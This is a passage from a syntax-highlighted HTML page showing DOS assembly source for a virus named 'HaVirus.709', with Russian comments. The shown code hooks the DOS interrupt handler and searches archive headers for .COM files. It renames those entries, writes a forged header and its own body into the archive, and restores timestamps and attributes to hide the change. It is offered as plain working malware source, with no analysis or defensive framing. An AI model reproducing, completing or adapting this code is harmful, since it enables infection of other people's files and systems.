        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc1">;[Считываем статические данные заголовка]</span><span class="sc0">

</span><span class="sc5">Loop2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем путь к файлу и имя файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekZero</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekZero</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем остаток заголовка]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Это COM файл?]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MO'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found2</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель на следующий блок]</span><span class="sc0">

</span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Loop2</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем дату и время создания файла]</span><span class="sc0">

</span><span class="sc5">RestTime</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">RestAttr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление настоящему обработчику Int 21h]</span><span class="sc0">

</span><span class="sc5">Quit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Ofs21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Seg21h</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Перемещаем указатель на расширение файла]</span><span class="sc0">

</span><span class="sc5">Found2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF9h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Меняем расширение найденного файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Dummy</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Вычисляем CRC32 вируса]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Loop3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">Loop4</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Skip</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB8h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
</span><span class="sc5">Skip</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop4</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop3</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Меняем поля заголовка]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">07h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">09h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в конец файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Записываем новый заголовок]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Записываем вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в начало файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Записываем основной заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
</span><span class="sc5">RestTimeB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">











</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                             ПОДПРОГРАММЫ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">SeekZero</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SeekZero</span><span class="sc0">
</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">FindZero</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FindZero</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Int65h</span><span class="sc0">
</span><span class="sc5">Read1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Read</span><span class="sc0">
</span><span class="sc5">Read2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">Int65h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Seek</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Int65h</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                    ДАННЫЕ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">VirName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'HaVirus.709 -- Copyright (c) by DJ Sadovnikov'</span><span class="sc0">
</span><span class="sc5">Dummy</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'OV'</span><span class="sc0">

</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">

</span><span class="sc5">Temp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">121h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">VirSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
